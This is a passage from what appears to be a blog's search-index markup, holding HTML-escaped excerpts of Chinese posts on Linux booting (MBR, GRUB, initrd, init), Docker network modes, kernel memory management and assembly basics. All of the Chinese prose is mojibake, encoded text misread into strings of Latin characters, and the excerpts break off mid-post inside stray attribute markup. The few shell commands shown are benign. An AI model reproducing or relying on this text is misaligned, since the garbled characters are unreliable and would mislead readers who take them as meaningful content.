&lt;li&gt;Partition Table åˆ†åŒºè¡¨ï¼Œå ç”¨64å­—èŠ‚ï¼Œæ¯ä¸ªä¸»åˆ†åŒºå ç”¨16å­—èŠ‚ï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸€å—ç¡¬ç›˜åªèƒ½æœ‰4ä¸ªä¸»åˆ†åŒºï¼‰&lt;/li&gt;
&lt;li&gt;åˆ†åŒºè¡¨æœ‰æ•ˆæ€§æ ‡è®°å ç”¨2å­—èŠ‚ ï¼ŒCPUå°†MBRè¯»å–è‡³å†…å­˜ï¼Œè¿è¡ŒGRUB(Boot Loaderå¸¸ç”¨çš„æœ‰GRUBå’ŒLILOä¸¤ç§ï¼Œç°åœ¨å¸¸ç”¨çš„æ˜¯GRUBï¼‰ï¼ŒGRUBä¼šæŠŠå†…æ ¸åŠ è½½åˆ°å†…å­˜å»æ‰§è¡Œã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# ll /boot
...
-rwxr-xr-x. 1 root root  6762688 Mar 31  2020 vmlinuz-3.10.0-1127.el7.x86_64
initramfs-2.6.32-642.el6.x86_64.img
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹å‡ºï¼Œå†…æ ¸æ–‡ä»¶å­˜åœ¨äº/boot/ç›®å½•ä¸‹ï¼Œ3.10.0-1127æ˜¯å†…æ ¸ç‰ˆæœ¬å·ï¼Œel7æ˜¯æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€‚ä½†æ˜¯åœ¨GRUBåŠ è½½å†…æ ¸æ—¶ï¼Œè¿/è¿˜æ²¡æœ‰è¢«åŠ è½½ï¼Œå®ƒæ˜¯æ€ä¹ˆåœ¨ç£ç›˜ä¸Šæ‰¾åˆ°å†…æ ¸çš„ï¼ŸåŠ è½½å†…æ ¸ä¸é€šè¿‡æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯ç›´æ¥è®¿é—®ç£ç›˜åˆ†åŒºï¼Œå› ä¸ºæ­¤æ—¶å†…æ ¸è¿˜æ²¡æœ‰å¯åŠ¨ï¼Œä¸å­˜åœ¨æ–‡ä»¶ç³»ç»Ÿã€‚çœ‹ä¸€ä¸‹grubé…ç½®æ–‡ä»¶(centosåœ¨/boot/grub2/grub.cfg)ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1631340349988.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;åœ¨/boot/grub/grub.confä¸­å¯ä»¥çœ‹åˆ°&lt;code&gt;root(hd0,0)&lt;/code&gt;ï¼Œè¡¨ç¤ºå†…æ ¸æ–‡ä»¶å’ŒåŠ è½½æ ¹æ–‡ä»¶ç³»ç»Ÿçš„é©±åŠ¨ç¨‹åºçš„ä½ç½®åœ¨ç¬¬ä¸€å—ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªåˆ†åŒºä¸‹ï¼Œåœ¨æ­¤åˆ†åŒºä¸­çš„ç›®å½•/boot/ï¼Œé©±åŠ¨ç¨‹åºå¯åœ¨initramfs-2.6.32-642.el6.x86_64.imgä¸­åŠ è½½ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªé˜¶æ®µæ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡å¼•å¯¼ç¨‹åºæ‰¾åˆ°å†…æ ¸å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚&lt;/p&gt;
&lt;h3 id=&#34;3åŠ è½½å†…æ ¸åˆå§‹åŒ–initrd&#34;&gt;3.åŠ è½½å†…æ ¸ï¼Œåˆå§‹åŒ–initrd&lt;/h3&gt;
&lt;p&gt;å°†å†…æ ¸åŠ è½½è‡³å†…å­˜ä¹‹åï¼Œå†…æ ¸ä¼šè¿›è¡Œæ¥ä¸‹æ¥çš„å·¥ä½œï¼šæ¢æµ‹ç¡¬ä»¶-&amp;gt;åŠ è½½é©±åŠ¨-&amp;gt;æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ(initrd)-&amp;gt;åˆ‡æ¢è‡³æ ¹æ–‡ä»¶ç³»ç»Ÿ(rootfs)-&amp;gt;è¿è¡Œ/sbin/initå®Œæˆåˆå§‹åŒ–å·¥ä½œã€‚&lt;/p&gt;
&lt;p&gt;æ­¤æ—¶ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œè¦è®¿é—®æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œéœ€è¦å…ˆæŒ‚è½½ï¼Œè€ŒæŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿéœ€è¦å…ˆåŠ è½½æ ¹æ–‡ä»¶ç³»ç»Ÿçš„é©±åŠ¨ç¨‹åºï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒGRUBåœ¨åŠ è½½å†…æ ¸è‡³å†…å­˜ä¸­æ—¶ï¼Œä¹ŸæŠŠinitrdåŠ è½½å†…æ ¸ä¸­å¹¶è¿è¡Œï¼Œè€Œinitrdæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;initrdé•œåƒæ–‡ä»¶ä¹Ÿå­˜åœ¨äº/bootä¸­ï¼Œå°†å…¶å±•å¼€åï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bin  dev  etc  init  lib  lib64  proc  root  run  sbin  shutdown  sys  sysroot  tmp  usr  var
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯è§å®ƒå’Œæˆ‘ä»¬å¸¸è§çš„æ ¹ç›®å½•çš„æ–‡ä»¶å¾ˆåƒï¼Œé‡Œé¢æœ‰binã€libã€lib64ã€sysã€varã€etcã€sysrootã€ devã€procã€tmpç­‰ç›®å½•ï¼Œå®ƒçš„åŠŸèƒ½ç°åœ¨å†…å­˜ä¸­å»ºç«‹ä¸€ä¸ªè™šæ‹Ÿçš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åå†åŠ è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ(rootfs)çš„é©±åŠ¨ï¼Œç„¶åä»¥è¯»å†™çš„æ–¹å¼æŒ‚è½½ï¼Œå°±æ˜¯çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;h3 id=&#34;4è¿è¡Œsbininitè¿è¡Œç³»ç»Ÿåˆå§‹åŒ–&#34;&gt;4.è¿è¡Œ/sbin/initï¼Œè¿è¡Œç³»ç»Ÿåˆå§‹åŒ–&lt;/h3&gt;
&lt;p&gt;æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å…¶ä¸­ä¸€ä¸ªç›®çš„å°±æ˜¯è¿è¡Œinitè¿›ç¨‹éœ€è¦ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä½œä¸ºè½½ä½“ï¼Œåœ¨å®Œæˆæ ¹æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ä¹‹åï¼Œä¼šæ‰§è¡Œç¬¬ä¸€ä¸ªè¿›ç¨‹initï¼Œinité¦–å…ˆè¿è¡Œ/etc/init/ä¸‹çš„è„šæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;initä¸»è¦å®Œæˆçš„å·¥ä½œæ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è·å¾—ç½‘ç»œç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;æŒ‚è½½è®¾å¤‡&lt;/li&gt;
&lt;li&gt;å¼€æœºå¯åŠ¨ç”»é¢Plymouthï¼ˆå–æ›¿äº†è¿‡å¾€çš„ RHGBï¼‰&lt;/li&gt;
&lt;li&gt;åˆ¤æ–­æ˜¯å¦å¯ç”¨SELinux&lt;/li&gt;
&lt;li&gt;æ˜¾ç¤ºäºå¼€æœºè¿‡ç¨‹ä¸­çš„æ¬¢è¿ç”»é¢&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–ç¡¬ä»¶&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·è‡ªå®šä¹‰æ¨¡å—çš„åŠ è½½&lt;/li&gt;
&lt;li&gt;é…ç½®å†…æ ¸çš„å‚æ•°&lt;/li&gt;
&lt;li&gt;è®¾ç½®ä¸»æœºå&lt;/li&gt;
&lt;li&gt;åŒæ­¥å­˜å‚¨å™¨&lt;/li&gt;
&lt;li&gt;è®¾å¤‡æ˜ å°„å™¨åŠç›¸å…³çš„åˆå§‹åŒ–&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ–è½¯ä»¶ç£ç›˜é˜µåˆ—ï¼ˆRAIDï¼‰&lt;/li&gt;
&lt;li&gt;åˆå§‹åŒ– LVM çš„æ–‡ä»¶ç³»ç»ŸåŠŸèƒ½&lt;/li&gt;
&lt;li&gt;æ£€éªŒç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼ˆfsckï¼‰&lt;/li&gt;
&lt;li&gt;è®¾ç½®ç£ç›˜é…é¢(quota)&lt;/li&gt;
&lt;li&gt;é‡æ–°ä»¥å¯è¯»å†™æ¨¡å¼æŒ‚è½½ç³»ç»Ÿç£ç›˜&lt;/li&gt;
&lt;li&gt;æ›´æ–°quotaï¼ˆéå¿…è¦ï¼‰&lt;/li&gt;
&lt;li&gt;å¯åŠ¨ç³»ç»Ÿè™šæ‹Ÿéšæœºæ•°ç”Ÿæˆå™¨&lt;/li&gt;
&lt;li&gt;é…ç½®æœºå™¨ï¼ˆéå¿…è¦ï¼‰&lt;/li&gt;
&lt;li&gt;æ¸…é™¤å¼€æœºè¿‡ç¨‹å½“ä¸­çš„ä¸´æ—¶æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;åˆ›å»ºICEç›®å½•&lt;/li&gt;
&lt;li&gt;å¯åŠ¨äº¤æ¢åˆ†åŒºï¼ˆswapï¼‰&lt;/li&gt;
&lt;li&gt;å°†å¼€æœºä¿¡æ¯å†™å…¥/var/log/dmesgæ–‡ä»¶ä¸­&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç­‰ã€‚ç„¶åæ ¹æ®/etc/inittabä¸­è®¾å®šçš„ç³»ç»Ÿè¿è¡Œé»˜è®¤çº§åˆ«ï¼Œç„¶åæŒ‰ç…§å¯¹åº”çš„çº§åˆ«xï¼Œè¿è¡Œ/etc/rc.d/rcxè„šæœ¬.....&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åœ¨è¾ƒæ–°çš„linuxå†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨äº†systemdæ›¿æ¢è°ƒäº†initè¿›ç¨‹ä½œä¸ºç¬¬ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;5æ‰“å°ç™»å½•æç¤ºä¿¡æ¯&#34;&gt;5.æ‰“å°ç™»å½•æç¤ºä¿¡æ¯&lt;/h3&gt;
&lt;p&gt;ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆåï¼Œinitç»™å‡ºç”¨æˆ·ç™»å½•æç¤ºç¬¦ï¼ˆloginï¼‰æˆ–è€…å›¾å½¢åŒ–ç™»å½•ç•Œé¢ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·å’Œå¯†ç ç™»é™†åï¼Œç³»ç»Ÿä¼šä¸ºç”¨æˆ·åˆ†é…ä¸€ä¸ªç”¨æˆ·IDï¼ˆuidï¼‰å’Œç»„IDï¼ˆgidï¼‰ï¼Œè¿™ä¸¤ä¸ªIDæ˜¯ç”¨æˆ·çš„èº«ä»½æ ‡è¯†ï¼Œç”¨äºæ£€æµ‹ç”¨æˆ·è¿è¡Œç¨‹åºæ—¶çš„èº«ä»½éªŒè¯ã€‚ç™»å½•æˆåŠŸåï¼Œæ•´ä¸ªç³»ç»Ÿå¯åŠ¨æµç¨‹è¿è¡Œå®Œæ¯•ï¼&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1114481&lt;/p&gt;
">ã€linuxã€‘linuxå¯åŠ¨è¿‡ç¨‹</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-wang-luo/"" data-c="
          &lt;p&gt;Dockerå®¹å™¨ç½‘ç»œèµ„æºé€šè¿‡å†…æ ¸çš„Network Namespaceæœºåˆ¶å®ç°éš”ç¦»ï¼Œä¸åŒçš„Network Namespaceæœ‰çš„å„è‡ªçš„ç½‘ç»œè®¾å¤‡ã€åè®®æ ˆã€è·¯ç”±è¡¨ã€é˜²ç«å¢™è§„åˆ™ç­‰ï¼Œåä¹‹ï¼Œç»Ÿä¸€Network Namespaceä¸‹çš„è¿›ç¨‹å…±äº«åŒä¸€ç½‘ç»œè§†å›¾ã€‚é€šè¿‡å¯¹Network Namespaceçš„çµæ´»æ“ä½œï¼ŒDockeræä¾›äº†äº”ç§å®¹å™¨ç½‘ç»œæ¨¡å¼ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;noneï¼šä¸ä¸ºå®¹å™¨é…ç½®ä»»ä½•ç½‘ç»œé…ç½®&lt;br&gt;
&lt;code&gt;docker run --net=none -it ubuntu ip addr show&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;containerï¼šä¸å¦ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨å…±äº«Network Namespaceï¼Œå…±äº«ç›¸åŒçš„ç½‘ç»œè§†å›¾&lt;br&gt;
&lt;code&gt;docker run --net=container:d258... -it ubuntu /bin/bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;hostï¼šä¸ä¸»æœºå…±äº«Root Network Namespaceï¼Œå®¹å™¨æœ‰å®Œæ•´çš„æƒé™å¯ä»¥æ“çºµä¸»æœºçš„åè®®æ ˆã€è·¯ç”±è¡¨å’Œé˜²ç«å¢™ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯ä¸å®‰å…¨çš„ã€‚&lt;br&gt;
&lt;code&gt;docker run --net=host -it ubuntu /bin/bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;bridgeï¼šDockerè®¾è®¡çš„NATç½‘ç»œæ¨¡å‹ã€‚&lt;br&gt;
è¿™ç§æ–¹å¼æ˜¯Docker é»˜è®¤çš„è¿è¡Œæ–¹å¼ï¼ŒDocker daemonå¯åŠ¨æ—¶ä¼šåœ¨ä¸»æœºåˆ›å»ºä¸€ä¸ªlinuxç½‘æ¡¥(é»˜è®¤ä¸ºdocker0)ï¼Œå®¹å™¨å¯åŠ¨æ—¶ï¼ŒDockerä¼šåˆ›å»ºä¸€å¯¹veth pairè®¾å¤‡ï¼Œè¯¥è®¾å¤‡æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œç›¸å½“äºä¸€ä¸ªç½‘çº¿çš„ä¸¤ä¸ªæ¥å£ï¼Œä¸€ç«¯æ¥åœ¨å®¹å™¨çš„Network Namespaceï¼Œå¦ä¸€ç«¯æ¥åœ¨docker0ç½‘æ¡¥ä¸Šï¼Œä»è€Œå¯ä»¥å®ç°å®¹å™¨çš„ç½‘ç»œé€šä¿¡ã€‚&lt;br&gt;
ç½‘æ¡¥æ¨¡å¼ä¸‹ï¼ŒDockerå®¹å™¨å’ŒInternetçš„é€šä¿¡ï¼Œä»¥åŠä¸åŒå®¹å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œéƒ½æ˜¯é€šè¿‡iptablesè§„åˆ™æ§åˆ¶çš„ã€‚æ€»ä¹‹ï¼Œdockerç½‘ç»œçš„åˆå§‹åŒ–åŠ¨ä½œåŒ…æ‹¬ï¼šåˆ›å»ºdocker0ç½‘æ¡¥ï¼Œä¸ºdocker0ç½‘æ¡¥æ–°å»ºå­ç½‘ä»¥åŠè·¯ç”±ã€åˆ›å»ºç›¸åº”çš„iptablesè§„åˆ™ç­‰ã€‚é»˜è®¤å­ç½‘ç½‘æ®µä¸º172.17.0.0/16ã€‚&lt;/li&gt;
&lt;li&gt;overlayï¼šDockeråŸç”Ÿçš„è·¨ä¸»æœºå¤šå­ç½‘æ¨¡å‹ã€‚&lt;br&gt;
è¿™ç§æ–¹å¼æ¯”è¾ƒå¤æ‚ï¼Œä¸æƒ³å­¦äº†ã€‚&lt;/li&gt;
&lt;/ol&gt;
">ã€å®¹å™¨ã€‘ç½‘ç»œé…ç½®</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-04-nei-cun-guan-li/"" data-c="
          &lt;ul&gt;
&lt;li&gt;å†…å­˜ç®¡ç†å•å…ƒ(MMU)ï¼Œé€šè¿‡åˆ†æ®µåˆ†é¡µçš„æœºåˆ¶ï¼Œæä¾›è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„æ–¹æ³•ã€‚&lt;/li&gt;
&lt;li&gt;linuxå†…æ ¸æ€è¿›ç¨‹ä¹‹é—´å…±äº«åœ°å€ç©ºé—´ï¼Œå¦‚æœè¿›è¡Œç®¡ç†ï¼Ÿ&lt;/li&gt;
&lt;li&gt;linuxç”¨æˆ·æ€è¿›ç¨‹ä¹‹é—´åœ°å€ç©ºé—´æ˜¯éš”ç¦»çš„ï¼Œå¦‚æœè¿›è¡Œç®¡ç†ï¼Ÿ&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;è¯»Linuxå†…æ ¸ä»¥åŠç›¸å…³çš„èµ„æ–™çš„æ—¶å€™ï¼Œæ—¶åˆ»è¦æ¸…é†’åœ°è®¤è¯†åˆ°å®ƒè¯´çš„æ˜¯å†…æ ¸æ€è¿˜æ˜¯ç”¨æˆ·æ€çš„ä¸œè¥¿ã€‚&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹/çº¿ç¨‹åœ¨å†…æ ¸ä¸­éƒ½æ˜¯ç”¨ä¸€ä¸ªtask_structçš„å®ä¾‹æè¿°çš„ï¼Œè¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼è®¾è®¡æ¨¡å¼é‡Œé¢çš„æ¡¥æ¥æ¨¡å¼(handle-body), ç”¨æˆ·æ€çœ‹åˆ°çš„è¿›ç¨‹PIDï¼Œçº¿ç¨‹TIDéƒ½æ˜¯handle, task_structæ˜¯bodyã€‚&lt;/li&gt;
&lt;li&gt;Cè¯­è¨€ä¹¦é‡Œé¢è®²çš„å †ã€æ ˆå¤§éƒ¨åˆ†éƒ½æ˜¯ç”¨æˆ·æ€çš„æ¦‚å¿µï¼Œç”¨æˆ·æ€çš„å †ã€æ ˆå¯¹åº”ç”¨æˆ·è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´é‡Œçš„ä¸€ä¸ªåŒºåŸŸï¼Œæ ˆå‘ä¸‹å¢é•¿ï¼Œå †ç”¨mallocåˆ†é…ï¼Œå‘ä¸Šå¢é•¿ã€‚&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·ç©ºé—´çš„å †æ ˆï¼Œåœ¨task_struct-&amp;gt;mm-&amp;gt;vm_areaé‡Œé¢æè¿°ï¼Œéƒ½æ˜¯å±äºè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€ä¸ªåŒºåŸŸã€‚&lt;/li&gt;
&lt;li&gt;è€Œå†…æ ¸æ€çš„æ ˆåœ¨tsak_struct-&amp;gt;stacké‡Œé¢æè¿°ï¼Œå…¶åº•éƒ¨æ˜¯thread_infoå¯¹è±¡ï¼Œthread_infoå¯ä»¥ç”¨æ¥å¿«é€Ÿè·å–task_structå¯¹è±¡ã€‚æ•´ä¸ªstackåŒºåŸŸä¸€èˆ¬åªæœ‰ä¸€ä¸ªå†…å­˜é¡µ(å¯é…ç½®)ï¼Œ32ä½æœºå™¨ä¹Ÿå°±æ˜¯4KBã€‚&lt;/li&gt;
&lt;li&gt;æ‰€ä»¥è¯´ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å†…æ ¸æ ˆï¼Œä¹Ÿæ˜¯è¿›ç¨‹ç§æœ‰çš„ï¼Œåªæ˜¯åœ¨task_struct-&amp;gt;stacké‡Œé¢è·å–ã€‚&lt;/li&gt;
&lt;li&gt;å†…æ ¸æ€æ²¡æœ‰è¿›ç¨‹å †çš„æ¦‚å¿µï¼Œç”¨kmalloc()åˆ†é…å†…å­˜ï¼Œå®é™…ä¸Šæ˜¯Linuxå†…æ ¸ç»Ÿä¸€ç®¡ç†çš„ï¼Œä¸€èˆ¬ç”¨slabåˆ†é…å™¨ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå†…å­˜ç¼“å­˜æ± ï¼Œç®¡ç†æ‰€æœ‰å¯ä»¥kmalloc()åˆ†é…çš„å†…å­˜ã€‚æ‰€ä»¥ä»åŸç†ä¸Šçœ‹ï¼Œåœ¨Linuxå†…æ ¸æ€ï¼Œkmallocåˆ†é…çš„æ‰€æœ‰çš„å†…å­˜ï¼Œéƒ½æ˜¯å¯ä»¥è¢«æ‰€æœ‰è¿è¡Œåœ¨Linuxå†…æ ¸æ€çš„taskè®¿é—®åˆ°çš„ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;ä½œè€…ï¼šå‘æ™¨&lt;br&gt;
é“¾æ¥ï¼šhttps://www.zhihu.com/question/57013926/answer/151306072&lt;br&gt;
æ¥æºï¼šçŸ¥ä¹&lt;br&gt;
è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
">ã€linuxã€‘å†…å­˜ç®¡ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/hui-bian-01-ji-suan-ji-di-ceng-ji-chu/"" data-c="
          &lt;h3 id=&#34;æ±‡ç¼–è¯­è¨€çš„ç»„æˆ&#34;&gt;&lt;strong&gt;æ±‡ç¼–è¯­è¨€çš„ç»„æˆ&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;æ±‡ç¼–è¯­è¨€ç”±ä»¥ä¸‹3ç±»æŒ‡ä»¤ç»„æˆï¼š&lt;br&gt;
1ï¼‰æ±‡ç¼–æŒ‡ä»¤ï¼ˆä¸æœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹åº”ï¼Œå®ƒæ˜¯æœºå™¨ç çš„åŠ©è®°ç¬¦ï¼‰&lt;br&gt;
2ï¼‰ä¼ªæŒ‡ä»¤ï¼ˆç”±ç¼–è¯‘å™¨è¯†åˆ«å¹¶æ‰§è¡Œï¼‰&lt;br&gt;
3ï¼‰å…¶å®ƒç¬¦å·ï¼ˆç”±ç¼–è¯‘å™¨è¯†åˆ«å¹¶æ‰§è¡Œï¼‰&lt;br&gt;
æ±‡ç¼–è¯­è¨€çš„æ ¸å¿ƒæ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œæ±‡ç¼–æŒ‡ä»¤å†³å®šäº†æ±‡ç¼–ç¨‹åºçš„ç‰¹æ€§ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä»€ä¹ˆæ˜¯å­˜å‚¨å™¨&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯å­˜å‚¨å™¨ï¼Ÿ&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;CPUæ˜¯è®¡ç®—æœºçš„æ ¸å¿ƒéƒ¨ä»¶ï¼Œå®ƒæ§åˆ¶ç€æ•´ä¸ªè®¡ç®—æœºçš„è¿ä½œå¹¶è¿›è¡Œç³»ç»Ÿè¿ç®—ï¼Œè¦æƒ³è®©CPUå·¥ä½œï¼Œå°±å¿…é¡»å‘å®ƒæä¾›æœºå™¨æŒ‡ä»¤å’Œæ•°æ®ï¼ŒæŒ‡ä»¤æ˜¯å‘Šè¯‰CPUæ€ä¹ˆåšï¼Œæ•°æ®æ˜¯CPUæ‰§è¡Œä»»åŠ¡çš„åŸææ–™ã€‚è¿™äº›æœºå™¨æŒ‡ä»¤å’Œæ•°æ®æ˜¯å­˜æ”¾åœ¨å­˜å‚¨å™¨ä¸­çš„ã€‚è®¡ç®—æœºä¸­å¤§å¤šæ•°çš„ç¡¬ä»¶éƒ½æœ‰å­˜å‚¨å™¨ï¼Œé™¤äº†CPUå¤–ï¼Œæ˜¾å¡ã€BIOSç­‰ä¹Ÿéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å­˜å‚¨å™¨ã€‚&lt;br&gt;
å­˜å‚¨å™¨çš„å­˜å‚¨å®¹é‡å•ä½æ˜¯å­—èŠ‚ï¼ˆByteï¼Œä¸€ä¸ªå­—èŠ‚æœ‰8ä½ bitï¼Œå³2çš„8æ¬¡æ–¹ï¼‰ï¼Œ1KB=1024Byteï¼Œ1MB=1024KBï¼Œ1GB=1024MBï¼Œ1TB=1024GBã€‚&lt;br&gt;
ç£ç›˜çš„å®¹é‡å•ä½å’Œå­˜å‚¨å™¨çš„å®¹é‡å•ä½æ˜¯ä¸€æ ·çš„ã€‚Byteå•ä½æ˜¯å¾®æœºä¸­æœ€æœ€å¸¸ç”¨çš„è®¡é‡å•ä½ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯å†…å­˜&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯å†…å­˜ï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;å†…å­˜æ˜¯è®¡ç®—æœºç»“æ„ä¸­æœ€ä¸»è¦çš„ä¸€ä¸ªå­˜å‚¨å™¨ï¼Œä»…æ­¤è€Œå·²ã€‚å­˜å‚¨å™¨ä¸ç­‰äºå†…å­˜ï¼Œæ¯”å¦‚æ˜¾å¡ä¸­çš„æ˜¾å­˜ä¹Ÿå±äºå­˜å‚¨å™¨ï¼Œæ‰€ä»¥å­˜å‚¨å™¨åŒ…æ‹¬äº†å†…å­˜ã€æ˜¾å­˜ç­‰å¤šç§ç±»å‹çš„å­˜å‚¨å™¨ã€‚åœ¨ä¸€å°PCæœºä¸­ï¼Œå†…å­˜çš„ä½œç”¨ä»…æ¬¡äºCPUã€‚ç¦»å¼€äº†å†…å­˜ï¼Œæ€§èƒ½å†å¥½çš„CPUä¹Ÿæ— æ³•å·¥ä½œã€‚ç£ç›˜ä¸åŒäºå†…å­˜ï¼Œç£ç›˜ä¸­çš„æ•°æ®æˆ–ç¨‹åºå¦‚æœä¸è®²åˆ°å†…å­˜ä¸­å»ï¼Œå®ƒå°±æ— æ³•è¢«CPUä½¿ç”¨ã€‚æ‰€ä»¥ï¼Œå­¦ä¹ æ±‡ç¼–è¯­è¨€åŸºæœ¬ä¸Šå°±æ˜¯åœ¨å­¦ä¹ CPUå¦‚ä½•è°ƒç”¨å¹¶ä½¿ç”¨å†…å­˜ä¸­çš„æ•°æ®ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯æŒ‡ä»¤å’Œæ•°æ®&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯æŒ‡ä»¤å’Œæ•°æ®ï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;æŒ‡ä»¤å’Œæ•°æ®æ˜¯åº”ç”¨ä¸Šçš„æ¦‚å¿µï¼ŒåŒä¸€ä¸²äºŒè¿›åˆ¶ä»£ç ï¼Œå¯ä»¥æ˜¯æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•°æ®ï¼Œè¿™å†³å®šäºæˆ‘ä»¬çš„ç¨‹åºè®¾è®¡ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-undefined&#34;&gt;1000100111011000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å½“è¢«åº”ç”¨ä¸ºæ•°æ®æ—¶ï¼Œå®ƒç­‰äº 89D8Hï¼ŒH è¡¨ç¤ºæ˜¯åå…­è¿›åˆ¶ã€‚å½“è¢«åº”ç”¨ä¸ºæŒ‡ä»¤æ—¶ï¼Œå®ƒæŒ‡çš„æ˜¯ MOV  AX, BXã€‚&lt;br&gt;
&lt;strong&gt;ä¸éš¾çœ‹å‡ºï¼ŒåŒä¸€ä¸²äºŒè¿›åˆ¶ä»£ç ï¼Œåº”ç”¨ä¸åŒï¼Œæ—¢å¯ä»¥ä½œä¸ºæŒ‡ä»¤ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ•°æ®æ¥ä½¿ç”¨ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯å­˜å‚¨å•å…ƒ&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯å­˜å‚¨å•å…ƒï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
